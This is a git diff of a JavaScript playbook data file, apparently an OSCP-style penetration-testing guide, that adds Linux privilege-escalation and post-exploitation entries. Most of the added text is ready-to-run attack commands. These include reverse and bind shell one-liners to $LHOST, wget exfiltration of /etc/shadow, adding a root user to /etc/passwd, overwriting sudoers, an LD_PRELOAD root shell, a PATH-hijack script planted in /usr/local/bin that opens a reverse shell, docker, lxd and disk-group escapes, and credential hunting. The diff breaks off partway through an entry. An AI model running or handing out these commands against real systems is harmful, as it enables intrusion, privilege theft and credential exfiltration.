@@ -55,6 +55,7 @@ cd ~/results/$ip`,
       { label: "Services & ports", next: "jump_services" },
       { label: "Windows persistence", next: "persistence" },
       { label: "LOLBins — Windows built-in abuse", next: "lolbins" },
+      { label: "GTFOBins — Linux built-in abuse", next: "gtfobins_linux" },
       { label: "Password attacks hub", next: "password_attacks" },
       { label: "HTTP password brute force", next: "bruteforce" },
       { label: "Scan notes — document findings", next: "scan_notes" },
@@ -245,16 +246,19 @@ searchsploit -x <path/to/exploit>`,
     cmd: `# Linux privesc reference`,
     warn: null,
     choices: [
-      { label: "Initial foothold — orient and enumerate", next: "linux_post_exploit" },
+      { label: "Quick enum reference — one-liners", next: "linux_enum_quick" },
+      { label: "Initial foothold — full enum flow", next: "linux_post_exploit" },
       { label: "LinPEAS — automated enum", next: "linpeas" },
       { label: "sudo -l — quickest win", next: "sudo_check" },
-      { label: "SUID binaries", next: "suid_check" },
+      { label: "SUID binaries / capabilities", next: "suid_check" },
       { label: "Cron jobs", next: "cron_check" },
-      { label: "Groups / PATH hijack", next: "linux_privesc_extra" },
-      { label: "Deep manual enum (capabilities/passwd/NFS)", next: "linux_manual_enum" },
-      { label: "Kernel exploit", next: "kernel_exploit" },
+      { label: "/etc/passwd or /etc/shadow abuse", next: "passwd_shadow" },
+      { label: "Groups — docker/lxd/disk/PATH hijack", next: "linux_privesc_extra" },
       { label: "Password hunting — files/history/configs", next: "linux_password_hunt" },
-      { label: "Custom wordlist generation", next: "custom_wordlist" },
+      { label: "Capabilities / NFS / writable files", next: "linux_manual_enum" },
+      { label: "GTFOBins — Linux LOLBins reference", next: "gtfobins_linux" },
+      { label: "Kernel exploit", next: "kernel_exploit" },
+      { label: "Got root — loot and persist", next: "got_root_linux" },
       { label: "Back to jump menu", next: "jump_menu" },
     ],
   },
@@ -836,43 +840,231 @@ Find-DomainShare -CheckShareAccess`,
     ],
   },
 
+  gtfobins_linux: {
+    phase: "LINUX",
+    title: "GTFOBins — Linux Living Off The Land",
+    body: "Unix binaries that can be abused for privesc, file read/write, shells, and transfer. Reference: gtfobins.github.io — always filter by your context (SUID, sudo, capabilities).",
+    cmd: `# ── REFERENCE ────────────────────────────────────────
+# https://gtfobins.github.io
+# Filter by: Shell | Sudo | SUID | File Read | File Write | Capabilities
+
+# ── SHELL — ESCAPE RESTRICTED SHELLS ─────────────────
+python3 -c 'import os; os.system("/bin/bash")'
+perl -e 'exec "/bin/bash";'
+ruby -e 'exec "/bin/bash"'
+lua -e 'os.execute("/bin/bash")'
+awk 'BEGIN {system("/bin/bash")}'
+find / -name . -exec /bin/bash \; -quit
+expect -c 'spawn /bin/bash; interact'
+node -e 'require("child_process").spawn("/bin/bash",{stdio:"inherit"})'
+
+# ── FILE READ — READ ANY FILE ─────────────────────────
+# When binary has sudo/SUID/cap_dac_read_search
+cat /etc/shadow   # if readable
+# less
+sudo less /etc/shadow
+# !/bin/sh to get shell while in pager
+
+# more
+sudo more /etc/shadow
+
+# tail
+sudo tail -f /etc/shadow
+
+# head
+sudo head /etc/shadow
+
+# sort
+sudo sort /etc/shadow
+
+# base64 (encode then decode on Kali)
+base64 /etc/shadow | base64 -d
+
+# tee (read + write)
+sudo tee /etc/shadow
+
+# cp (SUID — copy to readable location)
+cp /etc/shadow /tmp/s && cat /tmp/s
+
+# wget (exfil as POST)
+sudo wget --post-file=/etc/shadow http://$LHOST:4444
+# Kali listener: nc -nlvp 4444
+
+# curl
+curl file:///etc/shadow
+
+# dd
+sudo dd if=/etc/shadow
+
+# xxd
+sudo xxd /etc/shadow | xxd -r
+
+# ── FILE WRITE — WRITE ANY FILE ──────────────────────
+# tee
+echo "r00t::0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
+
+# dd
+echo "r00t::0:0::/root:/bin/bash" | sudo dd of=/etc/passwd oflag=append conv=notrunc
+
+# cp (SUID)
+echo "joe ALL=(ALL) NOPASSWD:ALL" > /tmp/s && cp /tmp/s /etc/sudoers
+
+# ── SUDO ESCAPES (common binaries) ───────────────────
+# vim
+sudo vim -c ':!/bin/bash'
+# nano — Ctrl+R Ctrl+X → reset; bash 1>&0 2>&0
+# less — !/bin/bash
+# man — !/bin/bash
+# git
+sudo git -p help    # then !/bin/bash in pager
+sudo git branch --help   # then !/bin/bash
+# git log
+sudo git log --help --P   # then !/bin/bash
+# ftp
+sudo ftp
+# ftp> !/bin/bash
+# zip
+sudo zip /tmp/x.zip /etc/passwd -T --unzip-command="sh -c /bin/bash"
+# tar
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+# mysql
+sudo mysql -e '\! /bin/bash'
+# wget
+sudo wget -O /etc/sudoers http://$LHOST/sudoers
+# rsync
+sudo rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+# strace
+sudo strace -o /dev/null /bin/bash
+# nmap (old)
+sudo nmap --interactive
+# env
+sudo env /bin/bash
+# LD_PRELOAD (if env_keep)
+# cat > /tmp/pe.c << EOF
+# #include<stdlib.h>
+# void _init(){setuid(0);system("/bin/bash");}
+# EOF
+gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
+sudo LD_PRELOAD=/tmp/pe.so <allowed_cmd>
+
+# ── REVERSE SHELL ONE-LINERS ─────────────────────────
+# bash
+bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
+# python3
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+# perl
+perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
+# nc with -e
+nc -e /bin/bash $LHOST $LPORT
+# nc without -e
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $LHOST $LPORT > /tmp/f
+# php
+php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+# ── BIND SHELL ───────────────────────────────────────
+nc -nlvp 4444 -e /bin/bash   # target listens
+nc $ip 4444                   # connect from Kali`,
+    warn: "Always check gtfobins.github.io with the correct filter for your context — a binary exploitable via sudo may not be exploitable via SUID and vice versa.",
+    choices: [
+      { label: "sudo context", next: "sudo_check" },
+      { label: "SUID context", next: "suid_check" },
+      { label: "Got shell — stabilize it", next: "shell_upgrade" },
+      { label: "Back to Linux privesc", next: "linux_post_exploit" },
+    ],
+  },
+
   linux_privesc_extra: {
     phase: "LINUX",
-    title: "Linux Privesc — Groups and PATH",
-    body: "Docker, LXD, disk, adm group memberships are instant root. Writable PATH directory before a privileged binary call is reliable.",
-    cmd: `id   # check ALL group memberships
+    title: "Linux — Interesting Groups & PATH Hijack",
+    body: "Group membership can be instant root. Check id carefully — docker, lxd, disk, adm, staff all have known privesc paths.",
+    cmd: `# ── CHECK GROUP MEMBERSHIP ───────────────────────────
+id
+groups
+cat /etc/group | grep $(whoami)
 
-# Docker group — instant root
+# ── DOCKER GROUP ─────────────────────────────────────
+# docker group = root without sudo
+docker images
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# Now you have root filesystem access
+# Read shadow: cat /mnt/etc/shadow
+# Add user: echo "r00t::0:0::/root:/bin/bash" >> /mnt/etc/passwd
+
+# If no images available:
+docker pull alpine
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
-# LXD group — instant root
+# ── LXD / LXC GROUP ──────────────────────────────────
+# Build alpine image on Kali:
+# git clone https://github.com/saghul/lxd-alpine-builder
+# ./build-alpine → produces alpine.tar.gz
+# Transfer to target then:
 lxc image import ./alpine.tar.gz --alias alpine
 lxc init alpine privesc -c security.privileged=true
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 lxc start privesc
 lxc exec privesc /bin/sh
+# Inside container: cd /mnt/root && cat etc/shadow
 
-# disk group — read raw disk
+# ── DISK GROUP ───────────────────────────────────────
+# disk group = read raw disk = read any file
+df -h    # find which device / is on
 debugfs /dev/sda1
-debugfs> cat /etc/shadow
+# debugfs commands:
+# ls /root
+# cat /root/.ssh/id_rsa
+# cat /etc/shadow
+# Can also WRITE files (dangerous)
 
-# adm group — read logs (find creds in logs)
-grep -ri "password\\|pass\\|auth" /var/log/ 2>/dev/null
+# ── ADM GROUP ────────────────────────────────────────
+# adm group = read /var/log — hunt for creds
+grep -ri "password\|pass\|auth" /var/log/ 2>/dev/null | grep -v "^Binary"
+cat /var/log/auth.log | grep -i "pass\|accept\|fail"
+cat /var/log/apache2/access.log 2>/dev/null
+cat /var/log/apache2/error.log 2>/dev/null
+cat /var/log/mysql/error.log 2>/dev/null
 
-# Writable PATH hijack
+# ── STAFF GROUP ──────────────────────────────────────
+# staff can write to /usr/local — which is first in PATH
+# Plant malicious binary ahead of system binary
+ls -la /usr/local/bin/
+echo '#!/bin/bash
+bash -i >& /dev/tcp/$LHOST/4444 0>&1' > /usr/local/bin/service
+chmod +x /usr/local/bin/service
+# Wait for root to run "service"
+
+# ── PATH HIJACK ───────────────────────────────────────
 echo $PATH
-find / -writable -type d 2>/dev/null | grep -v proc
-# Create malicious binary ahead of real one in PATH
-printf '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/curl
-chmod +x /tmp/curl
-export PATH=/tmp:$PATH`,
-    warn: null,
+# If you can write to any dir early in PATH:
+find / -writable -type d 2>/dev/null | grep -E "bin|sbin|local"
+
+# Check if crontab or script calls binary without full path:
+cat /etc/crontab | grep -v "^#"
+# If: * * * * * root cleanup  (no full path)
+# Create malicious cleanup in writable PATH dir:
+echo '#!/bin/bash
+chmod +s /bin/bash' > /tmp/cleanup
+chmod +x /tmp/cleanup
+export PATH=/tmp:$PATH
+# Wait for cron to fire then: /bin/bash -p
+
+# ── VIDEO GROUP ───────────────────────────────────────
+# video group = read framebuffer = screenshot screen
+cat /dev/fb0 > /tmp/screen.raw   # capture screen
+
+# ── BACKUP GROUP ─────────────────────────────────────
+# backup group = read any file via tar
+tar -czf /tmp/shadow.tar.gz /etc/shadow
+tar -xzf /tmp/shadow.tar.gz -C /tmp
+cat /tmp/etc/shadow`,
+    warn: "docker and lxd group membership is instant root — check id immediately on every new shell. PATH hijack only works if the cron/script calls binaries without full path.",
     choices: [
-      { label: "Docker/LXD/disk group — ROOT!", next: "got_root_linux" },
-      { label: "PATH hijack worked — ROOT!", next: "got_root_linux" },
-      { label: "Nothing — kernel exploit", next: "kernel_exploit" },
+      { label: "Got root shell", next: "got_root_linux" },
+      { label: "Got shadow hashes", next: "hashcrack" },
+      { label: "Back to enum", next: "linux_post_exploit" },
     ],
   },
+
 
   // ==========================================
   //  DOCUMENTATION — MITRE ATT&CK SUBGRAPH
@@ -4972,28 +5164,75 @@ run post/multi/recon/local_exploit_suggester`,
   shell_upgrade: {
     phase: "SHELL",
     title: "Upgrade to Full TTY",
-    body: "Do this immediately. A dumb shell will cost you time when Ctrl+C kills your process or tab completion fails.",
-    cmd: `# Python TTY upgrade
+    body: "Do this immediately every time you get a shell. A dumb shell kills your process on Ctrl+C, breaks tab completion, and makes vim unusable. The python + Ctrl+Z trick is the standard.",
+    cmd: `# ── STEP 1: SPAWN A PTY ──────────────────────────────
+# Python3 (most common)
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-# or: python -c 'import pty; pty.spawn("/bin/bash")'
-# or: /usr/bin/script -qc /bin/bash /dev/null
 
-# Background + fix terminal
-# Ctrl+Z
+# Python2 fallback
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# script fallback (if no python)
+/usr/bin/script -qc /bin/bash /dev/null
+script /dev/null -c bash
+
+# socat (best — fully interactive, no extra steps needed)
+# Attacker:
+socat file:\`tty\`,raw,echo=0 tcp-listen:4444
+# Target:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4444
+
+# ── STEP 2: CTRL+Z TRICK ─────────────────────────────
+# After spawning PTY — background the shell
+# Press: Ctrl+Z
+# (shell goes to background, you're back on Kali)
+
+# ── STEP 3: FIX YOUR TERMINAL ────────────────────────
 stty raw -echo; fg
+# stty raw    = pass keystrokes directly (Ctrl+C works now)
+# -echo       = stop Kali echoing what you type
+# fg          = bring shell back to foreground
+# (you may need to press Enter once after fg)
 
-# Fix sizing
+# ── STEP 4: FIX TERMINAL SIZE AND ENVIRONMENT ─────────
 export TERM=xterm-256color
-stty rows 50 columns 200
+export SHELL=/bin/bash
 
-# Environment cleanup
+# Check your current terminal size on Kali first:
+# stty size   (on Kali — shows rows cols)
+stty rows 38 columns 200
+# Set to match your actual terminal dimensions
+
+# ── STEP 5: OPTIONAL CLEANUP ──────────────────────────
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-alias ls='ls -arlht --color=auto'`,
-    warn: null,
+alias ls='ls -arlht --color=auto'
+reset   # if display is garbled after Ctrl+Z
+
+# ── IF PYTHON NOT AVAILABLE ──────────────────────────
+which python python3 perl ruby php 2>/dev/null
+# perl
+perl -e 'exec "/bin/bash";'
+# ruby
+ruby -e 'exec "/bin/bash"'
+# awk
+awk 'BEGIN {system("/bin/bash")}'
+# find
+find / -name / -exec /bin/bash \;
+
+# ── CHECK WHAT SHELL YOU HAVE ─────────────────────────
+echo $0
+echo $SHELL
+cat /etc/shells
+which bash sh zsh
+
+# ── RLWRAP (for nc shells on Kali — before upgrade) ───
+# On Kali, wrap nc with rlwrap for arrow keys + history
+rlwrap nc -nlvp $LPORT`,
+    warn: "After stty raw -echo if something goes wrong and your terminal is broken — type 'reset' blindly and hit Enter. It will restore your terminal even if you can't see what you're typing.",
     choices: [
       { label: "Linux shell — start privesc", next: "linux_post_exploit" },
       { label: "Windows shell — start privesc", next: "windows_post_exploit" },
-      { label: "Shell keeps dying — stabilize it", next: "shell_troubleshoot" },
+      { label: "Shell keeps dying — troubleshoot", next: "shell_troubleshoot" },
     ],
   },
 
@@ -5002,215 +5241,881 @@ alias ls='ls -arlht --color=auto'`,
   // ==========================================
   linux_post_exploit: {
     phase: "LINUX",
-    title: "Linux — Initial Foothold",
-    body: "Grab local.txt, understand who you are and what you have access to. Orient before you enumerate.",
-    cmd: `id && whoami && hostname
-uname -a && cat /etc/os-release
-cat /etc/passwd   # all users
-ip a              # network position
+    title: "Linux Post-Exploit — Full Enum Flow",
+    body: "Automated tools first, manual while they run. Every new user = start from Step 1. Information gathering is cyclical.",
+    cmd: `# ── STEP 1: WHO AM I — INSTANT CONTEXT ──────────────
+id
+whoami
+hostname
+id | grep -i "sudo\|admin\|wheel\|docker\|lxd\|disk\|adm\|staff"
+# docker/lxd = instant root → linux_privesc_extra
+# sudo group  = sudo -l immediately
 
-# Grab the flag
-find / -name local.txt 2>/dev/null | xargs cat`,
+# ── STEP 2: LAUNCH AUTOMATED TOOLS IN BACKGROUND ─────
+# Start these first — they run while you do manual enum
+# LinPEAS
+wget http://$LHOST/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh
+/tmp/lp.sh | tee /tmp/linpeas_out.txt &
+# or in memory: curl http://$LHOST/linpeas.sh | bash
+
+# unix-privesc-check
+./unix-privesc-check standard 2>/dev/null | tee /tmp/upc_out.txt &
+
+# pspy (watch for cron processes without root)
+/tmp/pspy64 > /tmp/pspy_out.txt &
+
+# ── STEP 3: OS AND KERNEL ────────────────────────────
+uname -a
+cat /etc/issue
+cat /etc/os-release
+cat /proc/version
+arch
+
+# ── STEP 4: ALL USERS ────────────────────────────────
+cat /etc/passwd
+cat /etc/passwd | grep -v nologin | grep -v false
+# UID 0 = root, UID 1000+ = real users
+# nologin/false = service accounts — skip them
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'   # all UID 0 users
+
+# ── STEP 5: SUDO ─────────────────────────────────────
+sudo -l
+# → go to sudo_check if anything shows
+
+# ── STEP 6: SUID / CAPABILITIES ──────────────────────
+find / -perm -u=s -type f 2>/dev/null
+getcap -r / 2>/dev/null
+# → go to suid_check, cross-ref GTFOBins
+
+# ── STEP 7: NETWORK ──────────────────────────────────
+ip a
+# Two NICs = pivot opportunity
+ip route
+netstat -anp 2>/dev/null || ss -anp
+ss -anp | grep "127.0.0.1"   # internal services
+arp -a
+cat /etc/hosts
+
+# ── STEP 8: RUNNING PROCESSES ────────────────────────
+ps aux
+ps aux | grep root
+# Watch for cleartext creds in args:
+watch -n 1 "ps aux | grep pass"
+
+# ── STEP 9: CRON JOBS ─────────────────────────────────
+cat /etc/crontab
+ls -la /etc/cron*
+crontab -l
+sudo crontab -l 2>/dev/null
+grep "CRON" /var/log/syslog | tail -20
+cat /var/spool/cron/crontabs/* 2>/dev/null
+# → go to cron_check if writable script found
+
+# ── STEP 10: INSTALLED PACKAGES ──────────────────────
+dpkg -l 2>/dev/null | grep "^ii"
+rpm -qa 2>/dev/null
+ls -la /usr/bin/ /usr/sbin/ /opt/ /srv/ 2>/dev/null
+
+# ── STEP 11: FILE HUNTING ────────────────────────────
+# Do this EARLY — custom configs contain creds automated tools miss
+# User home directories
+find /home -name "*.txt" -o -name "*.conf" -o -name "*.ini" -o -name "*.bak" 2>/dev/null
+ls -la /home/*/
+cat /home/*/.bash_history 2>/dev/null
+
+# App configs — based on what's installed
+find /var/www /opt /srv -name "*.php" -o -name "*.conf" -o -name "*.env" -o -name "config.yml" 2>/dev/null | xargs grep -il "pass" 2>/dev/null
+cat /var/www/html/wp-config.php 2>/dev/null
+find / -name ".env" 2>/dev/null | xargs cat 2>/dev/null
+
+# SSH keys
+find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
+
+# KeePass
+find / -name "*.kdbx" 2>/dev/null
+
+# ── STEP 12: BASH HISTORY AND ENV ────────────────────
+cat ~/.bash_history
+cat ~/.bashrc | grep export
+cat ~/.nano_history ~/.mysql_history ~/.atftp_history 2>/dev/null
+env | grep -i "pass\|key\|secret\|token\|api\|db\|cred"
+cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
+
+# ── STEP 13: FIREWALL / IPTABLES ─────────────────────
+cat /etc/iptables/rules.v4 2>/dev/null
+iptables -L 2>/dev/null
+# Non-standard ports in iptables = internal services worth probing
+
+# ── STEP 14: DRIVES AND MOUNTS ───────────────────────
+cat /etc/fstab
+mount
+lsblk
+# Unmounted partitions = may contain creds/data
+
+# ── STEP 15: KERNEL MODULES ──────────────────────────
+lsmod
+/sbin/modinfo <module>   # get version info for exploit matching
+
+# ── STEP 16: COMPILERS AVAILABLE ─────────────────────
+which gcc g++ cc python python3 perl ruby 2>/dev/null
+# gcc present = can compile kernel exploits on target
+
+# ── STEP 17: WRITABLE DIRECTORIES ────────────────────
+find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | grep -v run
+find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v run | grep -v "/dev/"
+ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab
+# -rw-rw-rw- on /etc/passwd = instant root → passwd_shadow
+
+# ── STEP 18: GRAB FLAGS ───────────────────────────────
+find / -name local.txt 2>/dev/null | xargs cat 2>/dev/null
+find / -name proof.txt 2>/dev/null | xargs cat 2>/dev/null
+cat /root/proof.txt 2>/dev/null
+
+# ── NOTE: ENUMERATION IS CYCLICAL ────────────────────
+# Every new user = start over from Step 1
+# New user = new sudo perms, new files readable, new history
+# Lab pattern: env var cred → su root OR crunch+hydra on other users → sudo -l`,
+    warn: "Launch LinPEAS in the background at Step 2 — don't wait for it to finish before doing manual enum. The thing that gets you root is usually NOT in the automated output.",
+    choices: [
+      { label: "Quick one-liner reference", next: "linux_enum_quick" },
+      { label: "Interesting sudo — check it", next: "sudo_check" },
+      { label: "Run LinPEAS now", next: "linpeas" },
+      { label: "SUID binary found", next: "suid_check" },
+      { label: "Cron job found", next: "cron_check" },
+      { label: "Creds in env/history/files", next: "linux_password_hunt" },
+      { label: "/etc/passwd writable", next: "passwd_shadow" },
+      { label: "Interesting group (docker/lxd/disk)", next: "linux_privesc_extra" },
+      { label: "Kernel exploit path", next: "kernel_exploit" },
+    ],
+  },
+
+
+
+  linux_enum_quick: {
+    phase: "LINUX",
+    title: "Linux Enum — Quick Reference",
+    body: "One-liners only. No explanations. Run top to bottom on a new foothold. Full detail in linux_post_exploit.",
+    cmd: `# ── IDENTITY ─────────────────────────────────────────
+id
+whoami
+id | grep -i "sudo\|docker\|lxd\|disk\|adm\|wheel"
+cat /etc/passwd | grep -v nologin | grep -v false
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'   # UID 0 users
+
+# ── OS / KERNEL ──────────────────────────────────────
+uname -a
+cat /etc/issue
+cat /etc/os-release | head -5
+
+# ── SUDO ─────────────────────────────────────────────
+sudo -l
+
+# ── SUID ─────────────────────────────────────────────
+find / -perm -u=s -type f 2>/dev/null
+getcap -r / 2>/dev/null
+
+# ── NETWORK ──────────────────────────────────────────
+ip a
+ip route
+ss -anp | grep LISTEN
+ss -anp | grep "127.0.0.1"
+arp -a
+
+# ── PROCESSES ────────────────────────────────────────
+ps aux | grep root
+watch -n 1 "ps aux | grep pass"
+
+# ── CRON ─────────────────────────────────────────────
+cat /etc/crontab
+ls -la /etc/cron*
+cat /var/spool/cron/crontabs/* 2>/dev/null
+grep "CRON" /var/log/syslog | tail -20
+
+# ── WRITABLE / INTERESTING ───────────────────────────
+find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v run
+find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys
+ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab
+
+# ── HISTORY / ENV ────────────────────────────────────
+cat ~/.bash_history
+cat ~/.bashrc | grep export
+env | grep -i "pass\|key\|secret\|token"
+cat ~/.nano_history ~/.mysql_history ~/.atftp_history 2>/dev/null
+
+# ── SERVICES / PACKAGES ──────────────────────────────
+ps aux | grep -v "\[" | awk '{print $11}' | sort -u
+dpkg -l 2>/dev/null | grep -i "^ii" | awk '{print $2,$3}'
+rpm -qa 2>/dev/null
+
+# ── FILE HUNTING ─────────────────────────────────────
+find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | xargs grep -il "pass" 2>/dev/null
+find / -name "id_rsa" -o -name "*.kdbx" -o -name "wp-config.php" 2>/dev/null
+ls -la /var/www/html/ /opt/ /srv/ 2>/dev/null
+cat /var/log/auth.log 2>/dev/null | grep -i "pass\|fail" | tail -20
+
+# ── /ETC/PASSWD WRITABLE? ────────────────────────────
+ls -la /etc/passwd
+# -rw-rw-rw- = instant root
+
+# ── COMPILERS AVAILABLE? ─────────────────────────────
+which gcc g++ python python3 perl ruby 2>/dev/null`,
     warn: null,
     choices: [
-      { label: "New subnet visible in ip route — pivot!", next: "pivot_start" },
-      { label: "Run LinPEAS (automated, thorough)", next: "linpeas" },
-      { label: "sudo -l first (quickest win)", next: "sudo_check" },
+      { label: "sudo -l shows something", next: "sudo_check" },
+      { label: "SUID binary found", next: "suid_check" },
+      { label: "Cron job found", next: "cron_check" },
+      { label: "Creds in env/history", next: "linux_password_hunt" },
+      { label: "Interesting group membership", next: "linux_privesc_extra" },
+      { label: "Run LinPEAS", next: "linpeas" },
+      { label: "Kernel exploit path", next: "kernel_exploit" },
     ],
   },
 
   linpeas: {
     phase: "LINUX",
-    title: "LinPEAS",
-    body: "Transfer and run. Tee to a file so you can grep it later. Prioritize RED findings first, then YELLOW. Don't just read — grep for keywords.",
-    cmd: `# Transfer — try in order until one works
-python3 -m http.server 80   # on attacker
+    title: "LinPEAS + Automated Linux Enum",
+    body: "Module 18.1.3: run automated tools first for speed, but they miss custom configs. Always supplement with manual enum. LinPEAS color codes: RED = high priority, YELLOW = interesting.",
+    cmd: `# ── LINPEAS ───────────────────────────────────────────
+# On Kali:
+# cp /usr/share/peass/linpeas/linpeas.sh .
+# python3 -m http.server 80
 
-wget http://$LHOST/linpeas.sh -O /tmp/lp.sh            # preferred
-wget -q --no-check-certificate https://$LHOST/linpeas.sh -O /tmp/lp.sh  # SSL fallback
-curl http://$LHOST/linpeas.sh -o /tmp/lp.sh            # if wget missing
-curl -k https://$LHOST/linpeas.sh -o /tmp/lp.sh        # curl SSL fallback
+# Transfer and run (save output)
+wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
 chmod +x /tmp/lp.sh
-/tmp/lp.sh | tee /tmp/lp_out.txt
+/tmp/lp.sh | tee /tmp/linpeas_out.txt
 
-# Grep results for key vectors
-grep -i "sudo\\|suid\\|cron\\|writable\\|password\\|key\\|token" /tmp/lp_out.txt
+# Or run in memory (no disk touch)
+curl http://$LHOST/linpeas.sh | bash
 
-# Also run pspy for process monitoring
-wget http://$LHOST/pspy64 -O /tmp/pspy
-curl http://$LHOST/pspy64 -o /tmp/pspy   # fallback
-chmod +x /tmp/pspy && /tmp/pspy`,
-    warn: null,
+# If /tmp is noexec:
+cd /dev/shm && wget http://$LHOST/linpeas.sh -O lp.sh && chmod +x lp.sh && ./lp.sh
+
+# Exfil output to Kali
+# impacket-smbserver -smb2support kali . -username user -password pass
+# On target:
+# mount.cifs //$LHOST/kali /mnt -o username=user,password=pass
+# cp /tmp/linpeas_out.txt /mnt/
+
+# ── LINENUM ───────────────────────────────────────────
+wget http://$LHOST/LinEnum.sh -O /tmp/le.sh
+chmod +x /tmp/le.sh && /tmp/le.sh
+
+# ── UNIX-PRIVESC-CHECK (pre-installed on Kali) ────────
+# Already on Kali: /usr/bin/unix-privesc-check
+# Transfer to target:
+scp /usr/bin/unix-privesc-check user@$ip:/tmp/
+./unix-privesc-check standard > /tmp/output.txt
+./unix-privesc-check detailed > /tmp/output_detailed.txt
+cat /tmp/output.txt | grep -i "WARNING"
+
+# ── PSPY — WATCH PROCESSES WITHOUT ROOT ───────────────
+# Download: github.com/DominicBreuker/pspy
+wget http://$LHOST/pspy64 -O /tmp/pspy64
+chmod +x /tmp/pspy64
+/tmp/pspy64
+# Watch for cron jobs running as root (UID=0)
+# Ctrl+C to stop
+
+# ── LINPEAS COLOR GUIDE ───────────────────────────────
+# RED/YELLOW  = 95%+ chance of privesc vector
+# GREEN       = good for the attacker (interesting config)
+# Focus areas in order:
+# 1. Sudo version + CVEs
+# 2. SUID binaries
+# 3. Cron jobs
+# 4. Writable files owned by root
+# 5. Services running as root
+# 6. Password files / history
+# 7. Network services on loopback`,
+    warn: "LinPEAS misses custom one-off configs — the thing that gets you root is often not in the automated output. Always check bash history, env vars, and cron scripts manually.",
     choices: [
-      { label: "sudo rights found", next: "sudo_check" },
+      { label: "Sudo misconfiguration found", next: "sudo_check" },
       { label: "SUID binary found", next: "suid_check" },
-      { label: "Cron job found", next: "cron_check" },
-      { label: "Interesting group membership (docker/lxd/disk)", next: "linux_privesc_extra" },
-      { label: "Kernel looks vulnerable", next: "kernel_exploit" },
-      { label: "Nothing obvious — hunt passwords in files", next: "linux_password_hunt" },
-      { label: "Nothing obvious — deep manual enum", next: "linux_manual_enum" },
+      { label: "Cron job writable", next: "cron_check" },
+      { label: "Creds in history/env", next: "linux_password_hunt" },
+      { label: "Kernel exploit path", next: "kernel_exploit" },
+      { label: "Interesting group (docker/lxd/disk)", next: "linux_privesc_extra" },
     ],
   },
+
 
   sudo_check: {
     phase: "LINUX",
-    title: "Sudo Rights",
-    body: "sudo -l is always the first manual check. Anything here goes straight to GTFOBins. LD_PRELOAD and env_keep abuse are often overlooked.",
-    cmd: `sudo -l
+    title: "Sudo Exploitation",
+    body: "Module 18.4.2: sudo -l shows what you can run as root. Cross-ref with GTFOBins. Watch for AppArmor blocking — check /var/log/syslog if exploit fails.",
+    cmd: `# ── CHECK SUDO PERMISSIONS ───────────────────────────
+sudo -l
+# Key patterns:
+# (ALL : ALL) ALL              = full root — sudo -i or sudo su
+# (ALL) NOPASSWD: /usr/bin/vim = run vim as root no password
+# (root) /usr/bin/apt-get      = specific command
 
-# GTFOBins one-liners for common findings:
-# sudo vim      → :!/bin/bash
-# sudo nano     → Ctrl+R Ctrl+X then: reset; sh 1>&0 2>&0
-# sudo find     → sudo find . -exec /bin/sh \\; -quit
-# sudo python3  → sudo python3 -c 'import os; os.system("/bin/bash")'
-# sudo less     → sudo less /etc/passwd → !/bin/bash
-# sudo awk      → sudo awk 'BEGIN {system("/bin/bash")}'
-# sudo env      → sudo env /bin/sh
-# sudo tee      → echo "root2:$(openssl passwd -1 pass):0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
-# sudo cp       → copy /etc/sudoers, edit, copy back
+# ── FULL SUDO — INSTANT ROOT ──────────────────────────
+sudo -i
+sudo su
+sudo /bin/bash
+sudo -s
 
-# LD_PRELOAD abuse (if env_keep=LD_PRELOAD)
-# Write shared lib that spawns shell, sudo <anything>`,
-    warn: null,
+# ── COMMON GTFOBINS SUDO ONE-LINERS ──────────────────
+# vim
+sudo vim -c ':!/bin/bash'
+sudo vim -c ':py import os; os.system("/bin/bash")'
+
+# nano
+sudo nano
+# Inside nano: Ctrl+R Ctrl+X then: reset; sh 1>&0 2>&0
+
+# find
+sudo find . -exec /bin/sh \; -quit
+
+# python3
+sudo python3 -c 'import os; os.system("/bin/bash")'
+
+# less
+sudo less /etc/passwd
+# Inside less: !/bin/bash
+
+# awk
+sudo awk 'BEGIN {system("/bin/bash")}'
+
+# apt-get (Module 18.4.2 example)
+sudo apt-get changelog apt
+# Inside less/pager: !/bin/sh
+
+# tcpdump (Module 18.4.2 — may be blocked by AppArmor)
+COMMAND='id'
+TF=$(mktemp)
+echo "$COMMAND" > $TF
+chmod +x $TF
